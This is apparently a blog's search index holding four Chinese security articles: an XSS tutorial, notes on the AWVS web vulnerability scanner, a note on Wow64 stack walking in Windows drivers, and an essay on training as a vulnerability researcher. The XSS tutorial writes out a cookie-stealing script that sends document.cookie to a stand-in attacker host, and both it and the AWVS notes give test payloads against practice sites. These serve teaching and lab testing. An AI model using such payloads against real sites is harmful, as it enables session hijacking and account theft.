<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XSS漏洞入门]]></title>
    <url>%2F2019%2F01%2F25%2FXSS1%2F</url>
    <content type="text"><![CDATA[XSS 作为当今最火的漏洞，却在发现之初十分不受重视。因为其不稳定的成功率，没有什么自动化攻击手段以及大多需要和用户交互的攻击手法使得其处于一个鸡肋的尴尬地位。直至后来的 web2.0 时代，各大著名 网站相继沦陷， XSS 才逐渐进入众多安全人员的研究项目之中。 为什么会有XSS漏洞？同源策略利用 XSS 漏洞，可以通过在目标网站上执行自己的脚本，从而突破同源策略的限制。 浏览器有一个很重要的概念——同源策略(Same-Origin Policy)。所谓同源是指，域名，协议，端口都相同。不同源的客户端脚本(javascript、ActionScript)在没明确授权的情况下，不能读写对方的资源。 如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源。 下表给出了相对http://store.company.com/dir/page.html同源检测的示例。 URL 结果 原因 http://store.company.com/dir2/other.html 成功 http://store.company.com/dir/inner/another.html 成功 https://store.company.com/secure.html 失败 不同协议( https和http ) http://store.company.com:81/dir/etc.html 失败 不同端口 ( 81和80) http://news.company.com/dir/other.html 失败 不同域名 ( news和store ) XSS介绍XSS也就是跨站脚本，一般发生在浏览器层面，通常是由于用户可以在网站上可以提交各种各样的内容，但如果web服务端没有正确的处理用户输入的数据（没有做过滤或是其它转义处理没有正确的处理用户输入的数据），导致攻击脚本在浏览器中执行。 XSS 是一类主要的应用程序安全缺陷，常与其他漏洞一起造成更大的影响。它困扰着现在大多数的应用程序，比如非常注重安全的银行站点和互动性非常强的社交网站。与 SQL 注入不同的时候它更多时候被用于攻击同一站点内的其它用户，如微博、QQ空间等。的微博有时候在不知情的情况下关注了其它用户，或是QQ空间莫名转发了某条广告，那么通常就是受到了 XSS 漏洞的攻击。 123漏洞范例问： &lt;p style=&apos;color:red&apos;&gt;你好啊，尊敬的______&lt;/p&gt;答：&lt;p style=&apos;color:red&apos;&gt;你好啊，尊敬的 xxx&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt; 攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 XSS的分类XSS漏洞可以分为3种类型：反射型、存储型和基于DOM的XSS漏洞。他们看似有些特点相同，但在确定以及利用漏洞方面仍存在差异。 反射型XSS反射型XSS攻击过程示意图 练习题：http://news.twosecurity.xyz/search?id=2 Payload：Payload) XSS漏洞的主要成因：没有实施过滤或净化措施或过滤不严格。 当应用程序使用动态页面向用户显示搜索结果时，便会造成一种常见的XSS漏洞。这个页面会使用一个包含搜索关键字的参数，并且在响应过程中将文本返回给用户。这种机制对开发者而言非常方便，因为它允许从应用程序里调用一个定制的结果页面，而不用把搜索关键字里的消息硬编码。 提取用户提交的输入并将其插入到服务器响应的HTML代码，这是XSS漏洞的一个明显特征；如果应用程序没有实施任何过滤或净化措施，那便很容易受到攻击。可以肯定，如果该页面在用户的浏览器里显示，弹出消息便会出现以上情况。 这个简单的测试可以解释一些问题。首先是id参数的内容可用任何数据替代返回给浏览器；其次，无论服务器端应用程序如何处理这些数据，都无法阻止提交JavaScript代码，一旦错误页面在浏览器中显示，这些代码就会执行。 练习题：XSS输出在script标签中 Payload：Payload 详解：查看源码发现输出在script标签中,尝试alert(1)直接弹窗发现过滤了括号,尝试⽤反引号,但是⻚⾯400,这⾥是云服务的问题，需要把反引号进⾏url编码。 在现实世界的Web应用程序中，存在近75%的XSS漏洞属于这种简单的XSS bug。因为利用这种漏洞通常需要包含一段Javascript的利用代码，然后这些代码会将用户cookie等信息发送到攻击者的服务器。攻击代码通常是一个单独的请求与响应进行传送和执行。 存储型XSS第二种类型的XSS漏洞叫做存储型XSS。如果一名用户提交的数据被保存在应用程序中，数据通常会保存在一个后端数据库中，然后没有经过适当的过滤或净化就显示给其他用户，便会出现这种漏洞。 存储型XSS漏洞常见于支持用户互动的Web应用，或者在具有管理权限的员工访问用户记录和数据的应用程序中。以一个留言应用程序为例，它允许用户留言，然后其它用户和管理员都可以看到相关的留言。如果用户的留言中包含XSS攻击代码，而服务端没有过滤或净化这个数据，那么攻击者就可以借此发送包含JS攻击代码的留言，在查看过该留言的用户和管理员的浏览器中执行任意脚本。在这种情况下，攻击者就可以在用户不知情的情况下获得他的登录身份进行攻击。 一般情况下，存储型XSS漏洞的攻击通常分为两步。第一步攻击者在传入包含恶意代码的数据到应用，Web应用会保存这些数据。第二步，会有用户查看包含恶意代码的数据页面，这时恶意代码开始执行。 存储型XSS攻击过程示意图 下面这个示例包含一项搜索功能，可用于显示当前用户输入的查询，以及其他用户最近输入的查询列表。由于查询将按原样显示，应用程序容易受到反射型和存储型XSS攻击。 反射型与存储型XSS攻击在实施步骤上有两个重要的区别，使得存储型XSS攻击更加危险。首先，反射型XSS攻击要利用一个漏洞时，直接利用容易暴露，我们会选择某种方式诱使用户访问经过设计的URL。而存储型XSS攻击则没有这种要求。展开攻击后，只需要等待用户浏览该页面或功能，通常，这个页面是正常用户会主动访问的常规页面。 其次，如果用户在被攻击时已经登录了某社交网站，那么攻击者就更容易利用XSS漏洞达到攻击的目的。例如，如果用户当前正在看微博，那么攻击者就可以劫持用户的身份，以这个用户的身份登录这个网站。在反射型XSS攻击中，攻击者可能会诱导用户登陆并且单击他们提供的一个链接，来达到目的。但是，在存储型XSS攻击中，因为攻击代码被保存在用户自主访问的一个微博页面中，可能是相册之类，当攻击代码执行时，用户已经在登录了微博。 这些区别意味着存储型XSS漏洞存在比反射型XSS更加不易被发现。许多时候，攻击者可以向应用程序提交一些精心构造过的数据，然后等待用户访问它们。如果恰好用户是管理员，那么攻击者就能够完全攻破整个应用程序了。 练习题：在留言板中植入存储型XSS Payload：美女admin 基于DOM的XSS12注解：什么是DOM文档对象模型（Document Object Model，简称DOM），是W3C组织推荐的处理可扩展标志语言的标准编程接口 基于DOM的XSS不具有之前提到的两类漏洞的特点，在这种漏洞中，攻击者的JavaScript通过一些DOM处理后才能执行。首先，用户请求一个包含JavaScript的特殊URL，会由攻击者提交。然后服务器响应里不会包含攻击者的脚本，当用户的浏览器处理该响应时，这段攻击代码被前端JS里的DOM处理操作引发。 客户端Javascript能够访问浏览器的文本对象模型也就是DOM，它能够决定加载页面的URL。由应用程序发布的脚本可以从URL中提取数据，对这些数据进行处理后，让它动态更新页面的内容。这样应用程序就容易受到基于DOM的XSS攻击。 DOM树 DOM使用范例 1234567891011&lt;script type="text/javascript"&gt; function show() &#123; var name = document.getElementById("name"); var div = document.getElementById("place"); div.innerHTML = name.value; &#125; &lt;/script&gt; name：&lt;input id="name"/&gt; &lt;input type="submit" value="submit" onclick="show()"/&gt; &lt;div id="place"&gt; &lt;/div&gt; 功能：将名字通过参数传入到输入框，并使用JavaScript动态输出name。 这段脚本首先提取出ID为text的输入框的值，并把这个值写入页面的DOM中。如果按开发者预想的方式调用，URL中的name参数会被带入到输入框中。但是，如果攻击者在name 中插入一段HTML，那么这段代码将被动态写入页面中，并像服务器返回代码一样得以执行。 1234注解：svg标签：矢量图参考iframe标签：浮动框架参考innerHTML属性：设置或返回表格行的开始和结束标签之间的 HTML参考 基于DOM的XSS漏洞的利用过程 与存储型XSS漏洞相比，基于DOM的XSS漏洞与反射型XSS漏洞有更大的相似性。利用它们通常需要攻击者诱使一名用户访问一个包含恶意代码的专门设计的URL，并由服务器响应那个确保恶意代码得以执行的特殊请求。但是，在利用反射型与基于DOM的XSS漏洞的细节方面，还存在一些重要的差异，这点在稍后讨论。 练习题：Xss输出在inner html中 Payload：Payload%3E) 详解：innerHTML 属性设置或返回表格⾏的开始和结束标签之间的 HTML。这⾥就是在div标签之间插⼊input标签⾥的value值传⼊script alert⼀套没有弹框，原因如下：w3c规范innerHTML这个api插⼊的script标签不会被执⾏但是我们可以使⽤其他事件弹框，如来触发js。 反射型/存储型/ DOM 型区别总结反射型通常需要在URL中带入攻击代码，存储型多发生在如发贴/保存资料/发送消息等网站模块，比反射型更加隐蔽。DOM XSS 有可能是反射型也有可能是存储型，但一定会经过 DOM API 处理，然后触发 XSS。 有很多种利用XSS漏洞攻击网站其他用户的方式。最简单的一种，也是我们常用于说明XSS漏洞潜在影响的一种攻击，可导致攻击者截获通过验证的用户的会话令牌，通常会存放在网页的 cookie 中。在劫持用户的cookie后，攻击者就可以访问该用户经授权访问的所有数据和功能。 12注解：包含会话令牌的cookiehttp://news.twosecurity.xyz/search_res?keyword=2%3Cscript%3Enew+Image().src=%22http://target.com/%22%2bdocument.cookie;%3C/script%3E 用户正常登陆应用程序时，attacker.com会得到一个包含会话令牌的cookie. 我们经常在登陆某个网页时都会看到一个记住登陆状态的选项，这是应用程序在保存一个持久性cookie，在用户每次访问时重新进行有效验证。这时，即使目标用户未处于活动状态或者没有登陆应用程序，攻击者都可以成功实现其目标。使用这种cookie的应用程序更容易受到XSS漏洞的影响。 有人会疑惑，如果攻击者能够诱使用户访问他选择的URL，为什么他还要大费力气通过应用程序中的XSS漏洞传送自己的攻击代码呢？为什么他不在attatcker.com上保存一段恶意脚本，并向用户传送一个直接指向这段脚本的链接呢？这段脚本不是可以和上例中的脚本一样执行吗？为什么需要利用XSS漏洞？ 12注解：不同源的站点之间无法共享cookie，DOM等信息（参考课程开头的同源策略） 为防止不同域在用户浏览器中彼此干扰，浏览器会对从不同来源收到的内容进行隔离，攻击者的目的是截获用户的会话令牌。浏览器不允许任何旧有脚本访问一个站点的cookie，否则，会话就很容易被劫持。而且，只有发布cookie的站点能够访问这些cookie：仅在返回发布站点的HTTP请求中提交cookie；只有通过该站点返回的页面所包含或加载的JavaScript才能访问cookie。因此，如果直接在attatcker.com上的通过脚本获取document.cookie，它将无法获得twosecurity.xyz发布的cookie，劫持攻击也不会成功。 123举例解析如何跨站newImage().src=&quot;http://target.com/XSS_stealcookie?cookie=&quot;+document.cookie;XSS_stealcookie为接收所窃取cookie的脚本，此时target.com便访问到了twosecurity.xyz的cookie 就用户的浏览器而言，利用XSS漏洞的攻击之所以取得成功，是因为当用户请求攻击者的URL时，浏览恶意JavaScript是由twosecurity.xyz送交给它的。当用户请求攻击者的URL时，浏览器向attatcker.com提交一个请求，然后应用程序返回包含一段JavaScript的页面。和从twosecurity.xyz收到的任何JavaScript一样，浏览器会执行这段脚本，因为用户信任twosecurity.xyz。这也就是为何攻击的脚本能够访问twosecurity.xyz发布的cookie的原因，虽然它实际来自其他地方。这也是为何该漏洞被称作跨站点脚本的原因。 开发者通常认为不必担心低危XSS漏洞，浏览器会防御他们，而事实上XSS漏洞可以影响任何类型的Web应用程序；在某些情况下，即使漏洞并没有什么风险，也会为其它类型的攻击打下基础。 思维导图以下图片展示了XSS的测试流程 扩展学习1扩展学习——《浏览器的同源策略》 ：https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy 1扩展学习——《XSS与字符编码的那些事儿》：http://resource-host-smartgslb-com-static.smartgslb.com/resources/XSS_and_Character_Encoding.pdf 1扩展学习——《QQ邮箱word附件预览 XSS》 ：http://resource.host.smartgslb.com/resources/qqmail_word_xss.pdf 1扩展学习——《如何防御 XSS》：http://resource.host.smartgslb.com/resources/how_to_anti_xss.pdf 1xss漏洞入门拓展练习题https://xss-quiz.int21h.jp/]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWVS学习笔记]]></title>
    <url>%2F2019%2F01%2F24%2FAWVS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[AWVS全称为: Acunetix Web Vulnerability Scanner ，是一款对网站及服务器漏洞扫描的软件，包含付费版本及免 费版本，能够自动分析客户端脚本，并允许对 Ajax 和 Web 2.0 应用程序进行安全性测试。 AWVS 是业内最先 进且深入的 SQL 注入和跨站脚本测试软件。 音频 1 目前开放了在线扫描，注册即可以免费使用。 介绍AWVS全称为: Acunetix Web Vulnerability Scanner ，是一款对网站及服务器漏洞扫描的软件，包含付费版本及免 费版本，能够自动分析客户端脚本，并允许对 Ajax 和 Web 2.0 应用程序进行安全性测试。 AWVS 是业内最先 进且深入的 SQL 注入和跨站脚本测试软件。 音频 1 目前开放了在线扫描，注册即可以免费使用。 下载地址 注意：AWVS版本问题 本课件中提供的AWVS安装版是Windows版本的，其他系统可使用官方提供的AWVS网页版，但是网页版只包含扫描器，未集成其他渗透测试工具，故不做推荐。 进行一次简单的扫描测试站点：http://testphp.vulnweb.com/ 这次我们主要会讲述一个常规的漏洞扫描测试过程，不会涉及到太多的配置，希望大家能够以体验为主。首先就讲一下常规的扫描，在菜单栏 new scan ，点击建立一个新的扫描。选择 Scan Type ，将需要扫描的网站网址填写在 Scan single website ，接着便点击 Next，直到出现 Finish，即为完成。 现在我们到 Login 部分，因为有些网站的业务逻辑需要登陆之后才会触发，所以 Login 功能可以帮助我们测试 到需要登陆才能操作的业务逻辑。方法和之前类似，先点击 New Scan ，新建一个扫描，然后点击 Login 。在 Login sequence 我们可以看到一个白色按钮，如果需要进行登陆后的扫描，点击白色按钮就会出现一个登陆录制的窗口。 我们在打开的窗口中进行登陆操作，登陆完成后，后面的两个步骤都只用点击 Next ，当探测到 session 之后， 点击 Finish 保存即可完成。 另外，我们也可以使用 AWVS 的自动探测登陆口登陆功能，只需要在对应的位置填入账户名和密码就行了。 解读一些配置项在新建的扫描窗口中，切换到 Options 选项，我们可以看到 Scanning profile 扫面策略。通常 我们只需要使用默认的策略便可以进行比较完整的扫描，但在我们对网站业务和技术栈有所了解的情况下可以 突出扫描一部分，或是不适用一部分的模块进行扫描。 ​ 下面介绍一下具体模块的功能： Default 默认设置，全面扫描 AcuSensor 将黑盒扫描和测试执行反馈结合起来，需要在目标测试站植入 sensor 传感器 Blind SQL Injection SQL 盲注的单一模块扫描 CSRF 跨站请求伪造的单一模块扫描 Directory And File Checks 扫描目录与文件 Empty 不使用任何检测 File Upload 文件上传漏洞的单一模块扫描 GHDB 利用 Google hacking 进行检测 High RiskAlerts 只检测高危漏洞 Network Scripts 网络脚本检测 Parameter Manipulation 参数篡改的单一模块扫描 Sqllnjection Sqllnjection Text Search 信息收集的单一模块扫描 Weak Passwords 弱囗令暴力破解的单一模块扫描 Web Applications Web 应用程序指纹探测 XSS 跨站脚本攻击检测的单一模块扫描 当我们对扫描目标的速度或者完全度有要求时可以尝试设置Scanning mode，它有三种设置模式：Heuristic模 式 、Quick 模式、Extensive 模式，分别为标准扫描，快速扫描以及全面扫描。这几种策略的主要区别在于URL 深度与扫描线程数。 然后我们就介绍如何设置：找到菜单栏的Configuration，选择Scan Settings，在弹出窗口的Scanning mode处 便可以进行设置。 注解：Scanning mode Heuristic模式：标准扫描 Quick 模式：快速扫描 Extensive 模式：全面扫描 区别在于URL深度与扫描线程数 【提问】如果时间紧促，你想对一个网站进行快速的扫描，该怎么做？ 【答案】打开菜单栏的Configuration，选择Scan Settings，在Scanning mode处选择Quick。 接下来介绍一下DeepScan，DeepScan指的是使用浏览器对目标进行加载渲染，这样可以获得更多的信息。该 功能默认清况时开启的，如果已知目标并没有使用前段框架的情况下可以关闭它，这样能够让扫描更加快速的进行。 注解：Deepscan 使用浏览器对目标进行加载渲染，以获得更多的信息 阅读漏洞报告当我们做完一次扫描后，则需要对扫描的结果进行分析解读，所以接下来会教大家怎么读 漏洞报告。漏洞报告里通常会包含漏洞描述（Vulnerability description），涉及到该漏洞的业务点（Affected items），它会产生什么样的影响（The impact of this vulnerability），需要怎样去修复该种类型的漏洞（How to fix this vulnerability），报告里还会有漏洞的详细介绍（Detailed information），以及相关的参考信息 （Web references）。 我们可以看到漏洞报告里不同颜色的感叹号，不同颜色感叹号的代表着不同等级的漏洞。 绿色代表情报，蓝色的则代表低危，黄色则是中危，而红色则代表是高危。 以下就是四种不同等级的漏洞的代表。 绿色代表情报信息 ​ 蓝色代表低危漏洞 ​ 黄色代表中危漏洞 ​ 红色代表高危漏洞 ​ 如果需要查看具体的漏洞细节则需要点击具体的漏洞项，打开具体的漏洞项后，需要对漏洞详情解读。 音频 13 漏洞详情里 Vulnerability description是对漏洞的一个描述。Attack details，攻击细节，包括使用的 Payload 之 类，其中View HTTP headers，是查看攻击使用的网络请求包；View HTML response，是通过网页方式查看攻击 请求的结果；另外三项涉及到了其他的模块，所以在这里就暂时不做介绍。Classification部分是对漏洞的几种评级，通常为 CWE 和 CVSS 。 查看具体漏洞项 ​ 查看攻击使用的网络请求包 注解：漏洞详情解读 View HTTP headers: 查看攻击使用的网络请求包 Attack details: 攻击细节，包括使用的 Payload View HTTP headers: 查看攻击使用的网络请求包 View HTML response: 通过网页方式查看攻击请求的结果 那么我们这里先对我们提供的漏洞测试站点进行扫描，来有一个对漏洞大概的了解 漏洞的复现是一种有助于我们学习的途径，这节课我们主要会讲述一些常见 web 漏洞的复现。14 首先我们要使用 AWVS 扫描你的专属测试站点：http://news.twosecurity.xyz ，下面的教学图文的中站点都使用你的专属测试站点进行测试 ​ 大家可以在漏洞报告中发现有很多不同的漏洞类型，我们会主要讲解 XSS、 SQL 注入以及远程代码执行这三种漏洞类型。 学习漏洞复现反射型XSS复现现在对我们开始时的漏洞报告进行复现，在我们的漏洞报告中，点击 View HTTP headers 可以看到详细 的请求内容。红框内是我们使用的 Payload，也叫攻击向量。 ​ 因为XSS 是由浏览器端触发的漏洞，这个 Request 又是 GET 请求，所以我们直接在 Firefox 浏览器中打开就行了。 测试URL：http://testphp.vulnweb.com/hpp/params.php?p=valid%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt(976143)%3C/ScRiPt%3E&amp;pp=12%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt(976143)%3C/ScRiPt%3E&amp;pp=12) 打开网页后，我们可以看到prompt(976143) 被成功执行。 再看到开始的漏洞报告，仍然点击 View HTTP headers，我们使用 HTTP 请求包重放的方式重放这个 Request。点击 View HTTP headers 下方的「Launch the attack with HTTP Editor」进行重放。 ​ 我们可以看到返回的包括了一个我们注入的XSS攻击向量返回的结果。我们尝试把 p 参数改成正常的 twosecurity， 就会发现响应内容正常，没有返回其它的信息，这通常表明这是一个XSS反射型漏洞。 SQL注入漏洞复现同样也是那份漏洞报告，首先也是点击 View HTTP headers 看到详细的请求内容。 ​ SQL 注入是发生在服务端，所以我们使用 HTTP 请求包重放的方式重放这个 Request。点击在 View HTTP headers 下方的「Launch the attack with HTTP Editor」进行重放。此时可以看到报错信息「You have an error in your SQL syntax;」，这是很典型的数据库报错。 ​ ​ 现在我们尝试把 url 参数 id 改成正常的id=1， 就会发现响应内容正常，没有发出报错信息，通常表明这就是一 个 SQL 注入。 ​ 结束以下的思维导图展示的是AWVS的常规功能 ​ 扩展学习 w3af Web应用程序攻击和检查框架：http://github.com/andresriancho/w3af 尝试读到http://news.twosecurity.xyz/的源码：https://news.twosecurity.xyz/ 课后作业 1. 使用 AWVS 快速扫描以下站点进行学习 http://testhtml5.vulnweb.com http://testphp.vulnweb.com 2. 找出高危、中危、低危和情报分别有几个 3. 找出这些漏洞所属的类型，总结如果对这个网站进行攻击可以从哪些方面入手]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wow64栈回溯和模块枚举]]></title>
    <url>%2F2019%2F01%2F21%2FWow64%E6%A0%88%E5%9B%9E%E6%BA%AF%E5%92%8C%E6%A8%A1%E5%9D%97%E6%9E%9A%E4%B8%BE%2F</url>
    <content type="text"><![CDATA[来源：公众号“信安之路”作者：Anhkgg 很久没写驱动代码，最近又摸了一下。在驱动中回溯调用栈，找到特定模块，获取模块地址，大小，路径等信息，然后…. 堆栈回溯驱动中通常使用RtlWalkFrameChain来获取调用栈信息，接口如下：123456ULONG RtlWalkFrameChain（OUT PVOID * 呼叫者， IN ULONG 计数， IN ULONG 标志）;//呼叫者一个PVOID数组，保存栈中retaddr值//计数表示数组大小//标志= 0获取内核层栈信息，= 1获取应用层栈信息//返回值表示栈的层数 还有其他函数，未使用：12VOID RtlGetCallersAddress（OUT PVOID * CallersAddress， //地址保存第一呼叫者。OUT PVOID * CallersCaller //地址保存第二个呼叫者。）RtlCaptureStackBackTrace 其实对于单纯的x86（ring3） - &gt; x86（ring0），和x64（ring3） - &gt; x64（ring0）没什么好说的，就是普通的栈信息。 我这里要着重提的是x86（ring3） - &gt; x64（ring0），也就是64位系统的32位程序在进行系统调用时的堆栈（称为Wow64）。 先看看CreateFile的栈信息.Windbg并不能直接通过k显示wow64到内核的所有栈信息，wow64部分需要通过扩展指令切换，具体如下：而RtlWalkFrameChain（x，n，1）是可以完整获取到wow64到nt之前的所有应用层栈信息。如下：123456789101112131400000000 `7796c08a // NTDLL！ZwCreateFile函数+是0xA 00000000 `73c8c1ff 00000000 `73c7d18f 00000000 `73c02776 00000000 `73c7d286 00000000 `73c7c69e 00000000 `7795f9b6 00000000 `779bbb89 00000000 `7794a0ee // 00000000`00000000没有这层76f1 c76b // ntdll_77b00000！NtCreateFile + 0x12 75583f66 755853 c4 013259e2 需要注意的是，两个ntdll并不一样（ntdll_77b00000是32位dll），并且ntdll中间出现了wow64和wow64cpu两个模块，这就涉及到具体x86调用（wow64）如何切换到x64了，这里不展开。 进程模块枚举可能大家都知道驱动中枚举模块的一种方法（非ZwQuerySystemInformation，SystemModuleInformation），使用进程Peb-&gt; Ldr链表枚举，可以获取到模块的路径，基地，大小等信息。下面是通常驱动下获取模块信息的代码，适用于x64内核获取x64进程模块信息以及x86内核获取x86进程模块信息。 那特殊的Wow64又有什么不同呢？（x64内核获取x86进程模块信息）。对于wow64进程来说，EPROCESS结构中有个特殊字段保存wow64的peb结构。1234结构_EPROCESS&#123; PVOID Wow64Process ; //&#125; Win7之前Wow64Process是_WOW64_PROCESS结构，内部包含字段位wow64的peb，win7后Wow64Process直接就是wow64的peb。直接就可以通过PsGetProcessWow64Process（未文档化函数）来获取到该字段。1Peb = PsGetProcessWow64Process（Process）; //流程- &gt; Wow64Process wow64的peb结构不再是_ PEB，而是使用于wow64的_PEB32，一大特点就是所有的地址都是32位的，为了在x64下定义这种字段，只好使用ULONG。123456789101112#pragma pack（push，1）typedef struct _PEB32 &#123; BOOLEAN InheritedAddressSpace ; //除非BOOLEAN ReadImageFileExecOptions，否则这四个字段不能更改 ; // BOOLEAN BeingDebugged ; // BOOLEAN SpareBool ; // ULONG 突变体 ; // INITIAL_PEB结构也会更新。ULONG ImageBaseAddress ; ULONG Ldr ; // PPEB_LDR_DATA32&#125; PEB32， * PPEB32 ; #pragma pack（pop） 结构中Ldr位32位地址指针，使用ULONG定义，Ldr 也是特殊的_ PEB_LDR_DATA32结构，字段和普通的_PEB_LDR_DATA完全一致，只是地址全为ULONG（32位，x64地址为64位）。123456789typedef struct _PEB_LDR_DATA32 &#123; ULONG Length ; ULONG 初始化 ; // bool ULONG SsHandle ; LIST_ENTRY32 InLoadOrderModuleList ; LIST_ENTRY32 InMemoryOrderModuleList ; LIST_ENTRY32 InInitializationOrderModuleList ; ULONG EntryInProgress ; // pvoid&#125; PEB_LDR_DATA32， * PPEB_LDR_DATA32 ; 如此wow64进程模块信息获取的方法也出来了。参考： http://www.cnblogs.com/welfear/archive/2010/11/16/1878503.htmlhttp://www.kernelmode.info/forum/viewtopic.php?t=2516http://rce.co/category/wow64/]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>栈回溯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全研究者的自我修养（完整版）]]></title>
    <url>%2F2019%2F01%2F16%2F%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E8%80%85%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%88%E5%AE%8C%E6%95%B4%E7%89%88%EF%BC%89%2F</url>
    <content type="text"><![CDATA[来源：Seebug Paper 原文地址：https://paper.seebug.org/789/ 作者：riusksk公众号：漏洞战争 注：本文为原文上下篇合集在上篇文章《推荐今年C3黑客大会上的几个议题》中提到“AttackingChrome IPC”这个议题，我觉得该议题最大的亮点是在前半场，作者nedwill是之前在Hack2Win大赛上因攻破Chrome浏览器而一战成名，他讲了如何训练漏洞研究能力的过程，讲述自己这几年在漏洞研究上的历程和心得，很励志，其建议也非常具有可操作性，值得效仿学习。我反复看了多遍，对其作了一些总结和补充。 刻意练习10000小时这份“鸡汤”道理，想必大家都懂，就不解释了，不懂的自行百度，或者去读读《异类》这本经典书籍。作者建议以月为单位来制定研究目标，他曾连续花了6个月的时间来研究Chrome Sandbox，但最终一无所获。所以，有时坚持了不一定能达到目标，但不坚持，就更没戏了。 训练挖洞的双技能 看洞：哪里看？历史漏洞的git log、bug报告、代码质量报告等等 识洞：就是肉眼看代码找漏洞，即代码审计，难点也就是在这上面，训练方法继续往下看 代码审计训练 根据自己目标定位，寻找相应的历史漏洞案例进行学习，比如要搞chrome就找 chrome的历史漏洞 掌握漏洞所在的模块或子系统，但不看完整的漏洞细节描述，尝试在漏洞版本中找出对应的漏洞 如果（2）中未能找出漏洞，就去看漏洞细节描述，对比自己的审计过程，看遗漏了哪一步骤 不断重复上述训练，直至相信：挖洞只是体力消耗，而非能力问题 这第4点说得，非常励志，因为挖洞挖久了，有时真的容易怀疑自己的能力，目标难度越大，越容易打击人。作者第一次训练的漏洞是j00ru（Project Zero成员）的IDA漏洞：https://j00ru.vexillium.org/2014/10/secure-2014-slide-deck-and-hex-rays-ida-pro-advisories-published/ ，2014年的文章了 3~5年的训练计划1~2年：做做 CTF 或 WarGames 题目，网上有很多CTF writeup可以参考学习2~3年：简单点的目标，就是找相对容易挖的产品3~5年：困难点的目标目标的难易程度可以直接参考相应的产品的漏洞奖励计划或私有市场的价格，挑选出一份目标清单，按难易程度排序，逐一去实现它。 Fuzzing训练作者代码审计2年后，才开始尝试Fuzzer开发。 拿已公开的历史漏洞问自己：如何写fuzzer挖掘到此漏洞？ 如果自己不知道此漏洞，那又能够挖掘到呢？ 不断重复训练并改进fuzzer，相信会有更多漏洞被意外发现 努力往往比运气和天赋更重要虽然挖洞也需要一定运气和天赋，但多数你认为的挖洞天才，其实只不过是花了比你多100倍，甚至更多的时间在这项技术研究上而已 进⼊研究者团队或社区，互相学习国外的交流氛围会比国内的更好一些，也更愿意分享。很多时候自己的交流圈，大多是一些熟识的同行，或者同事，一般可交流的人还是比较少的。经常在网上看到不少人会问，如何认识xx大牛、黑客，但其实很多时候却是：努力提高自己的专业能力，圈子最终会吸纳你进去认识更多圈内人。 建立自己的漏洞信息来源RSS订阅无疑是自己最好的方式，这个需要依赖平时自己去不断收集订阅。很多漏洞相关的博文，往往曝露出某些软件新的攻击面，抢占先机就显得尤为重要，比如当年Android stage rght mp4漏洞、word公式编辑器、adobe图片转换器等等，如果能及时关注并尝试去挖掘，往往可以收获不少漏洞的。 收集和学习开源的漏洞挖掘工具比如a 、honggfuzz、libfuzzer等很多优秀的漏洞挖掘工具，都是值得好好阅读代码，学习其中的fuzzing思路，可以更好地应用到未来的漏洞挖掘研究上。 很多不愿搞研究工作的挖洞人，只不过是为了权衡利弊在《从0到1：开启商业与未来的秘密》一书中有一章叫做“秘密”，漏洞研究可以当作挖掘秘密，为什么人们不探索秘密呢？书中提到4种原因，我觉得同样适用于漏洞研究领域： 渐进主义：把目标定得低一些，更容易取得好成绩； 风险规避：人们害怕秘密是因为怕犯错，除此之外，可能也担心KPI没法完成，又或者挖洞拿到的奖金又该如何跟公司“分赃”呢？ 自满：很多时候，某些人可以坐享其成，又何必自己去挖掘秘密；国内研究氛围又喜欢搞营销吹牛逼，牛逼吹多了吹大了，有时连自己都信了； 扁平化：任何一个拥有雄心壮志的人，在涉及某一研究领域之前都会问自己一个问题：如果有可能挖掘到漏洞，难道全球人才库中更加聪明、更加有技术能力的人还没有发现吗？这种怀疑的声音阻止了不少人去探索秘密，从事研究工作，因为身处的世界似乎大到任何个人都无法做出独特的贡献。 小结今年因个人原因，已从安全研究转向业务安全，深知研究的不易。相信安全领域有秘密的存在，虽会导致黑产的诞生，但肯定也会因此诞生一些优秀的研究者。这里以白桦的《船》致敬所有仍在安全研究道路上前进的人，与诸君共勉： 我有过多次这样的奇遇，从天堂到地狱只在瞬息之间：每一朵可爱、温柔的浪花都成了突然崛起、随即倾倒的高山。每一滴海水都变脸色，刚刚还是那样的美丽、蔚蓝；旋涡纠缠着旋涡，我被抛向高空又投进深渊……当时我甚至想到过轻生，眼前一片苦海无边；放弃了希望就像放弃了舵柄，在暴力之下只能沉默和哀叹。今天我才有资格嘲笑昨天的自己，为昨天落叶似的惶恐感到羞惭；虚度了多少年华，船身多次被礁石撞穿……千万次在大洋里撒网，才捕获到一点点生活的经验，才恍然大悟，啊！道理原是如此浅显；你要航行吗?必然会有千妖百怪出来阻拦；暴虐的欺凌是它们的游戏，制造灭亡是它们唯一的才干。命中注定我要常常和它们相逢，因为我的名字叫做船；面对强大于自身千万倍的对手，能援救自己的只有清醒和勇敢。恐惧只能使自己盲目，盲目只能夸大魔鬼的狰狞嘴脸；也许我的样子比它们更可怕，当我以命相拼，一往无前！只要我还有一根完整的龙骨，绝不驶进避风的港湾；把生命放在征途上，让勇敢来决定道路的宽窄、长短。我完完全全的自由了，船头成为埋葬它们的铁铲；我在波浪中有节奏地跳跃，就像荡着一个巨大的秋千。即使它们终于把我撕碎，变成一些残破的木片，我不会沉沦，决不！我还会在浪尖上飞旋。后来者还会在残片上认出我，未来的诗人会唱然长叹：“这里有一个幸福的灵魂，它曾经是一艘前进着的航船……” 